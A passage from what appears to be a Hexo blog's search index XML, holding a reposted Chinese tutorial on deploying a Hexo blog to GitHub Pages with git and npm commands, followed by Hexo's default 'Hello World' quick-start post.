  branch: master
</code></pre><h4 id="3-完成部署"><a href="#3-完成部署" class="headerlink" title="3.完成部署"></a>3.完成部署</h4><p>最后一步，快要成功了，键入指令：</p>
<pre><code>$ npm install hexo-deployer-git --save
$ hexo generate
$ hexo deploy
</code></pre><p>输入弹出框的用户名与密码(首次使用git会弹出)。<br>OK，我们的博客就已经完全搭建起来了，在浏览器输入（当然，是你的Repository名），例如我的：<a href="https://github.com/Introspelliam/Introspelliam.github.io.git" target="_blank" rel="external">Introspelliam.github.io/</a><br>每次修改本地文件后，需要键入hexo generate才能保存，再键入hexo deploy上传文件。<br>当然，不要忘了回退到父文件夹提交网站相关的文件以备今后迁移，依次执行git add .、git commit -m “…”、git push origin develop。</p>
<h3 id="日常操作"><a href="#日常操作" class="headerlink" title="日常操作"></a>日常操作</h3><h4 id="1-写文章"><a href="#1-写文章" class="headerlink" title="1.写文章"></a>1.写文章</h4><p>执行new命令，生成指定名称的文章至 Admin-blog\source_posts\文章标题.md 。</p>
<pre><code>$ hexo new [layout] &quot;文章标题&quot; #新建文章
</code></pre><p>然后用编辑器打开“文章标题.md”按照<a href="http://www.appinn.com/markdown/" target="_blank" rel="external">Markdown语法</a>书写文章。<br>其中layout是可选参数，默认值为post。到 scaffolds 目录下查看现有的layout。当然你可以添加自己的layout，<br>同时你也可以编辑现有的layout，比如post的layout默认是 hexo\scaffolds\post.md</p>
<pre><code>title: {{ title }}
date: {{ date }}
tags:
---
</code></pre><p>我想添加categories，以免每次手工输入，只需要修改这个文件添加一行，如下：</p>
<pre><code>title: {{ title }}
date: {{ date }}
categories:
tags:
---
</code></pre><p>文件标题也是md文件的名字，同时也出现在你文章的URL中，postName如果包含空格，必须用”将其包围。<br>请注意，大括号与大括号之间在不同版本间可能需要空格，否则会被转义，不能正常显示；所有文件&quot;：&quot;后面都必须有个空格，不然会报错。</p>
<h4 id="2-提交"><a href="#2-提交" class="headerlink" title="2.提交"></a>2.提交</h4><p>每次在本地对博客进行修改后，先执行下列命令提交网站相关的文件。</p>
<pre><code>$ git add .
$ git commit -m &quot;...&quot;
$ git push origin develop
</code></pre><p>然后才执行hexo generate -d发布网站到master分支上。</p>
<pre><code>$ hexo generate -d
</code></pre><h4 id="3-本地仓库丢失"><a href="#3-本地仓库丢失" class="headerlink" title="3.本地仓库丢失"></a>3.本地仓库丢失</h4><p>当你想在其他电脑工作，或电脑重装系统后，安装Git与Node.js后，可以使用下列步骤：</p>
<h5 id="3-1拷贝仓库"><a href="#3-1拷贝仓库" class="headerlink" title="3.1拷贝仓库"></a>3.1拷贝仓库</h5><pre><code>$ git clone -b develop https://github.com/Introspelliam/Introspelliam.github.io.git
</code></pre><h5 id="3-2配置Hexo"><a href="#3-2配置Hexo" class="headerlink" title="3.2配置Hexo"></a>3.2配置Hexo</h5><p>在本地新拷贝的chaooo.github.io文件夹下通过Git bash依次执行下列指令:</p>
<pre><code>$ npm install -g hexo-cli
$ npm install hexo
$ npm install
$ npm install hexo-deployer-git --save
</code></pre><h3 id="小Tips-hexo-命令"><a href="#小Tips-hexo-命令" class="headerlink" title="小Tips:hexo 命令"></a>小Tips:hexo 命令</h3><pre><code>hexo new &quot;postName&quot; #新建文章
hexo new page &quot;pageName&quot; #新建页面
hexo generate #生成静态页面至public目录
hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）
hexo deploy #将.deploy目录部署到GitHub
hexo help  # 查看帮助
hexo version  #查看Hexo的版本
hexo deploy -g  #生成加部署
hexo server -g  #生成加预览
#命令的简写
hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy
</code></pre><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>本文转载<a href="http://chaoo.oschina.io/2016/05/23/Hexo3-2-github%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2.html" target="_blank" rel="external">Hexo3.2+GitHub搭建静态博客</a></p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/06/12/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        <categories>
            
            <category> Hexo搭建博客网站 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
